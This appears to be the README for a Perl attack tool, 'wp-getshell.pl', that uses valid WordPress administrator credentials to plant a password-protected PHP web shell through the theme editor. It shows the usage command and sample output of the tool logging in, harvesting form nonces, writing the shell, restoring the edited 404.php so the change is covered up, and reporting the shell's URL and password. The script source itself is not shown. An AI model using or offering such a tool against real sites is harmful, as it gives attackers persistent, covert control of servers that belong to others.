# Wordpress GetShell - Public Edition

With a valid combination of username and password, the scripts below demostrates how to plant a PHP shell automatically

# Example usage

```
%> perl wp-getshell.pl http://ubuntu64/wordpress admin admin
[+] Logged in, replacing cookies
[+] Now looking for editor
[+] Editor found, old content length 48
[+] Building forms
    --> _wpnonce with value 09f8f3fb95
    --> file with value 404.php
    --> _wp_http_referer with value /wordpress/wp-admin/theme-editor.php?file=404.php
    --> scrollto with value 0
    --> theme with value twentyfourteen
    --> action with value update
[+] Saving files
[+] Accessing previously saved file
[+] Restoring contents of 404.php
[+] Checking if shell is in place
[+] PHP shell ready
    URL:  http://ubuntu64/wordpress/123.php
    Pass: xxx
```

# Legal disclaimer

Using this tool is legit but hacking may not be. The author does not take any responsibility for such activities.
